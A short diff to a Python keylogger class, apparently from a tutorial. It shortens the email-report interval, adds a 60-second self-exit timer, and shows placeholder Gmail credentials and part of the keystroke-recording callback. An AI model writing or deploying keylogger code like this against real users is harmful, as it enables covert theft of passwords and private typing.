@@ -6,9 +6,12 @@ from datetime import datetime
 import time
 import sys
 
-SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
+INTERRUPT_AFTER = 60 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
 EMAIL_PASSWORD = "thisisafakepassword"
+
+start_time = time.time()
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -47,6 +50,9 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         # finally, add the key name to our global `self.log` variable
         self.log += "{} - {}\n".format(timestamp, name)
+        # exit code if timer expired
+        if time.time() - start_time > INTERRUPT_AFTER:
+            sys.exit()
 
     def update_filename(self):
         # construct the filename to be identified by start & end datetimes
